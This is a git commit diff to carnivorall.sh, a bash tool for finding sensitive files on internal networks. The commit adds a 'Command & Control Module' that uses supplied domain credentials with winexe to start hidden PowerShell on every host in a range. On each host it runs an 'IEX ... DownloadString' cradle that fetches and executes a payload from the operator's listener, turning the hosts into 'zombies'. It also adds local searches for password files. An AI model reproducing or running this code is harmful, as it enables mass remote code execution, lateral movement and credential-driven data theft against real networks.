3b3a1ab9f0fb3fa69583dfcd192f78b6032eac8c
L0stControl <35183856+L0stControl@users.noreply.github.com>
2018-04-12 19:05:31 -0300

    Update carnivorall.sh

--- carnivorall.sh
+++ carnivorall.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
-#==============================================================================================
-#Title           :carnivorall.sh
-#Description     :Look for sensitive information on the internal network.
-#Authors         :L0stControl and BFlag
-#Date            :2018/03/29
-#Version         :0.6.1    
-#Dependecies     :smbclient / ghostscript / zip / ruby (nokogiri / httparty / colorize ) / yara 
-#==============================================================================================
+#=============================================================================================
+# Title           :carnivorall.sh
+# Description     :Look for sensitive information on the internal network.
+# Authors         :L0stControl and BFlag
+# Date            :2018/04/12
+# Version         :0.6.2    
+# Dependecies     :smbclient / ghostscript / zip / ruby (nokogiri / httparty / colorize / yara 
+#=============================================================================================
 
 SCRIPTHOME=$(readlink -f "$0" | rev | cut -d '/' -f 2- | rev)
 export PATH=$PATH:$SCRIPTHOME
@@ -42,14 +42,23 @@ function banner {
         -r, --regex "4[0-9]{12}[0-9]?{3}"           Search contents using REGEX
         -y, --yara <juicy_files.txt>                Enable Yara search patterns (not default)
         -e, --emails <y|n>                          Download all *.pst files (Prompt by default) 
-        -D, --delay <Number>                        Delay between requests  
+        -D, --delay <Number>                        Delay between requests
+       -lD, --localfolder /path/                    For search sensitive information in local files  
         -h, --help                                  Display options
-        -g, --google <max items>                    Search files on the website using Google (Obs: Set to "0" will search only in local files)
+        -g, --google <max items>                    Search files on the website using Google (Obs: Set to "0" to search in local files)
         -w, --website "domain.com"                  Website used at *-g/--google* feature
         
         Ex1: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY  
         Ex2: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o filenames
-        Ex3: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o yara -y juicy_files.txt 
+        Ex3: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o yara -y juicy_files.txt
+
+        -={ Command & Control Module }=-
+
+        -lH, --lhost 192.168.0.1                     Local ip to receive zombies responses
+        -lP, --lport 80                              Local port to listen
+        -pP, --pspayload <payload.ps1>                 Powershell payload file
+
+        Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 80 
 
 EOF
 }
@@ -125,12 +134,32 @@ case $KEY in
     shift 
     ;;
     -l|--list)
-    LIST="$2"
+    LISTHOSTS="$2"
     shift 
     shift 
     ;;
     -o|--only)
     ONLY="$2"
+    shift 
+    shift 
+    ;;
+    -lH|--lhost)
+    LHOST="$2"
+    shift 
+    shift 
+    ;;
+    -lD|--localfolder)
+    LFOLDER="$2"
+    shift 
+    shift 
+    ;;
+    -pP|--pspayload)
+    PSPAYLOAD="$2"
+    shift 
+    shift 
+    ;;
+    -lP|--lport)
+    LPORT="$2"
     shift 
     shift 
     ;;
@@ -151,7 +180,7 @@ set -- "${POSITIONAL[@]}" # restore positional parameters
 #-------------------------#
 
 NETWORK="${NETWORK:=notset}"
-LIST="${LIST:=notset}"
+LISTHOSTS="${LISTHOSTS:=notset}"
 DOMAIN="${DOMAIN:=notset}"
 USERNAME="${USERNAME:=notset}"
 PASSWORD="${PASSWORD:=notset}"
@@ -164,6 +193,10 @@ PATTERNMATCH="${PATTERNMATCH:=senha passw}"
 PIDCARNIVORALL=$$
 GOOGLE="${GOOGLE:=notset}"
 WEBSITE="${WEBSITE:=notset}"
+LHOST="${LHOST:=notset}"
+PSPAYLOAD="${PSPAYLOAD:=notset}"
+LPORT="${LPORT:=80}"
+LFOLDER="${LFOLDER:=notset}"
 MOUNTPOINT=~/.carnivorall/mnt
 SHARESFILE=~/.carnivorall/shares.txt
 FILESFOLDER=~/.carnivorall/files
@@ -252,8 +285,8 @@ function scanner
 function generateTargets
 {
     > $SHARESFILE # Clean targets file
-    if [ "$LIST" != "notset" ]; then
-        readarray -t IPS_FILE <<< "$(cat $LIST | while read LINE ; do generateRange.rb $LINE; done)"
+    if [ "$LISTHOSTS" != "notset" ]; then
+        readarray -t IPS_FILE <<< "$(cat $LISTHOSTS | while read LINE ; do generateRange.rb $LINE; done)"
         for HOSTS in "${IPS_FILE[@]}"
             do
                 scanner $HOSTS &
@@ -379,26 +412,131 @@ function searchFilesWithGoogle
     find $FILESFOLDER/$WEBSITE/downloads -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$WEBSITE/tmp $FILESFOLDER/$WEBSITE/ $LOG /{} \;
 }
 
+function executePowerShell
+{
+    HOSTSMB=$1
+    USERNAME=$2
+    PASSWORD=$3
+    DOMAIN=$4
+    SERVERCEC=$5 
+    ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC/ps.ps1')"
+    winexe64 -U "$DOMAIN\\$USERNAME%$PASSWORD" //"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD" 2>&1 > /dev/null
+}
+
+function startZombies
+{
+    > $SHARESFILE # Clean targets file
+    if [ "$LISTHOSTS" != "notset" ]; then
+        readarray -t IPS_FILE <<< "$(cat $LISTHOSTS | while read LINE ; do generateRange.rb $LINE; done)"
+        for HOSTS in "${IPS_FILE[@]}"
+            do
+                executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST &
+                sleep $DELAY
+            done 
+    else
+        readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
+        for HOSTS in "${IPS[@]}"
+        do
+            executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST &
+            sleep $DELAY
+        done
+    fi   
+}
+
+function exitZombies
+{
+    echo -e "$RED............Scan stopped! keep hacking =)$DEFAULTCOLOR"
+    WINEXEPID=$(ps ax |grep winexe |awk -F" " '{print $1}' |head -n1)
+    kill -9 $PIDCARNIVORALL 2>&1 > /dev/null
+    kill -9 $WINEXEPID 2>&1 > /dev/null
+}
+
+function searchLocalFilesByName
+{
+    LOCALFOLDER=$1
+    BASENAME=$(basename $LOCALFOLDER)
+    echo -e "$WHITE [+] Looking for suspicious filenames on $LOCALFOLDER"
+    echo -e "$DEFAULTCOLOR"
+    if [ ! -d $FILESFOLDER/$BASENAME ]; then
+        mkdir $FILESFOLDER/$BASENAME 2>&1 > /dev/null
+    fi
+    for p in $PATTERNMATCH
+    do
+        find $LOCALFOLDER \( -iname "*"$p"*" ! -iname "*.zip" \) -printf ' [+] %p\n' -type f -exec cp --backup=numbered {} $FILESFOLDER/$BASENAME \; |tee -a $LOG
+    done
+    
+    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
+        rm -rf $FILESFOLDER/$BASENAME/
+    fi
+    echo
+}
+
+function searchLocalFilesByContent
+{
+    LOCALFOLDER=$1
+    BASENAME=$(basename $LOCALFOLDER)
+    echo -e "$WHITE [+] Looking for suspicious content files in $LOCALFOLDER"
+    echo -e "$DEFAULTCOLOR"
+    if [ ! -d $FILESFOLDER/$BASENAME ]; then
+        mkdir $FILESFOLDER/$BASENAME
+        mkdir $FILESFOLDER/$BASENAME/tmp 
+    fi
+    find $LOCALFOLDER -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$BASENAME/tmp $FILESFOLDER/$BASENAME/ $LOG $BASENAME/{} $BASENAME \;
+
+    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
+        rm -rf $FILESFOLDER/$BASENAME/
+    fi
+    echo
+}
+
+function searchLocalFilesWithYara
+{
+    JUICE=$1
+    LOCALFOLDER=$2
+    echo -e "$GREEN [+]$WHITE Searching sensitive information with Yara $LOCALFOLDER"
+    echo -e "$DEFAULTCOLOR"
+    $YARA -r $JUICE $LOCALFOLDER |tee -a $LOG
+}
+
+function searchLocalFilesByRegex
+{
+    LOCALFOLDER=$2
+    BASENAME=$(basename $LOCALFOLDER)
+    echo -e "$WHITE [+] Looking for suspicious content files using REGEX [$REGEX] on $LOCALFOLDER"
+    echo -e "$DEFAULTCOLOR"
+    if [ ! -d $FILESFOLDER/$BASENAME ]; then
+        mkdir $FILESFOLDER/$BASENAME
+        mkdir $FILESFOLDER/$BASENAME/tmp 
+    fi
+    find $LOCALFOLDER -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$BASENAME/tmp $FILESFOLDER/$BASENAME/ $LOG $BASENAME \;
+
+    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
+        rm -rf $FILESFOLDER/$BASENAME/
+    fi
+    echo
+}
+
 #------#
 # main #
 #------#
+echo ""
 
-if [ "$NETWORK" == "notset" -a "$LIST" == "notset" -a "$GOOGLE" == "notset" ];then
+if [ "$NETWORK" == "notset" -a "$LISTHOSTS" == "notset" -a "$GOOGLE" == "notset" -a "$LFOLDER" == "notset" ];then
     banner
     echo
-    echo -e "$RED ERROR: $YELLOW You need to inform the network =( $DEFAULTCOLOR"
+    echo -e "$RED [-] ERROR: $YELLOW Syntax error! Please review the options. $DEFAULTCOLOR"
     echo
     exit
-elif [ "$LIST" != "notset" -a ! -e "$LIST" ];then
+elif [ "$LISTHOSTS" != "notset" -a ! -e "$LISTHOSTS" ];then
     banner
     echo
-    echo -e "$RED ERROR: $YELLOW File does not exist =( $DEFAULTCOLOR"
+    echo -e "$RED [-] ERROR: $YELLOW File does not exist $DEFAULTCOLOR"
     echo
     exit
 elif [ "$GOOGLE" != "notset" -a "$WEBSITE" == "notset" ]; then
     banner
     echo
-    echo -e "$RED ERROR: $YELLOW You need to inform the website =( $DEFAULTCOLOR"
+    echo -e "$RED [-] ERROR: $YELLOW You need to inform the website $DEFAULTCOLOR"
     echo -e "        $YELLOW Sintax example:$GREEN carnivorall -g 100 -w example.com $DEFAULTCOLOR"
     echo
     exit
@@ -417,16 +555,54 @@ if [ "$EMAILS" == "y" ];then
     chmod 777 /tmp/pstdefault
     elif [ "$EMAILS" == "n" ];then
     echo 2 > /tmp/pstdefault
+    chmod 777 /tmp/pstdefault
     else
     echo 0 > /tmp/pstdefault
+    chmod 777 /tmp/pstdefault
 fi
 
-if [ $GOOGLE == "notset" ]; then
-    checkHomeFolders
-    generateTargets
-else
+if [ $GOOGLE != "notset" -a $LHOST == "notset" ]; then
+
     searchFilesWithGoogle
     exit
+
+elif [ $GOOGLE == "notset" -a $LHOST != "notset" ]; then
+
+    if [ "$PSPAYLOAD" != "notset" ]; then
+        if [ ! -e "$PSPAYLOAD" ];then
+            echo -e "$RED [-] ERROR: $YELLOW File does not exist $DEFAULTCOLOR"
+        else
+            startZombies &
+            trap exitZombies 2 # Disable Ctrl-C
+            cec.rb "$LHOST" "$PSPAYLOAD" "$PATTERNMATCH" "$FILESFOLDER" "$LPORT" 
+        fi
+    fi
+
+elif [ $LFOLDER != "notset" ]; then
+
+    if [ ! -d "$LFOLDER" ]; then
+        echo -e "$RED [-] ERROR: $YELLOW Directory does not exist $DEFAULTCOLOR"
+    else
+        if [ $ONLY == "filenames" ];then
+            searchLocalFilesByName $LFOLDER
+        
+        elif [ $ONLY == "contents" ];then
+            searchLocalFilesByContent $LFOLDER
+           
+        elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
+            searchLocalFilesWithYara $YARAFILE $LFOLDER
+           
+        elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
+            searchLocalFilesByRegex $LFOLDER
+        else
+            searchLocalFilesByName $LFOLDER
+            searchLocalFilesByContent $LFOLDER
+        fi         
+    fi 
+
+else
+    checkHomeFolders
+    generateTargets
 fi
 
 while [ $(</dev/shm/holdcarnivorall) -eq 1 ]
@@ -467,21 +643,22 @@ if [ -s "$SHARESFILE" ];then
                TARGETPATH=$(awk "NR==$T" $SHARESFILE|awk -F"," '{print $2}')
                mountTarget $TARGETHOST $TARGETPATH
            
-               if [ $ONLY == "notset" -o $ONLY == "filenames" -o $REGEX == "notset" ];then
+               if [ $ONLY == "filenames" ];then
                    searchFilesByName $TARGETHOST $TARGETPATH
-               fi
-
-               if [ $ONLY == "notset" -o $ONLY == "contents" -o $REGEX == "notset" ];then
-                   searchFilesByContent $TARGETHOST $TARGETPATH
-               fi
                
-               if [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $ONLY == "notset" -a $YARAFILE != "notset" \) ] ; then
+               elif [ $ONLY == "contents" ];then
+                   searchFilesByContent $TARGETHOST $TARGETPATH           
+               
+               elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then 
                    searchFilesWithYara $YARAFILE
-               fi
-    
-               if [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o  \( $ONLY == "notset" -a $REGEX != "notset" \) ] ; then
+               
+               elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
                    searchFilesByRegex $TARGETHOST $TARGETPATH
-               fi 
+               
+               else
+                   searchFilesByName $TARGETHOST $TARGETPATH
+                   searchFilesByContent $TARGETHOST $TARGETPATH           
+               fi  
                umountTarget
            done
            continue
@@ -504,20 +681,21 @@ if [ -s "$SHARESFILE" ];then
            TARGETPATH=$(awk "NR==$OPT" $SHARESFILE|awk -F"," '{print $2}')
            mountTarget $TARGETHOST $TARGETPATH
            
-           if [ $ONLY == "notset" -o $ONLY == "filenames" -o $REGEX == "notset" ];then
+           if [ $ONLY == "filenames" ];then
                searchFilesByName $TARGETHOST $TARGETPATH
-           fi
            
-           if [ $ONLY == "notset" -o $ONLY == "contents" -o $REGEX == "notset" ];then
+           elif [ $ONLY == "contents" ];then
                searchFilesByContent $TARGETHOST $TARGETPATH           
-           fi
            
-           if [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $ONLY == "notset" -a $YARAFILE != "notset" \) ] ; then
+           elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
                searchFilesWithYara $YARAFILE
-           fi
-
-           if [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o  \( $ONLY == "notset" -a $REGEX != "notset" \) ] ; then
+           
+           elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
                searchFilesByRegex $TARGETHOST $TARGETPATH
+           
+           else
+               searchFilesByName $TARGETHOST $TARGETPATH
+               searchFilesByContent $TARGETHOST $TARGETPATH           
            fi         
            umountTarget
            trap 2
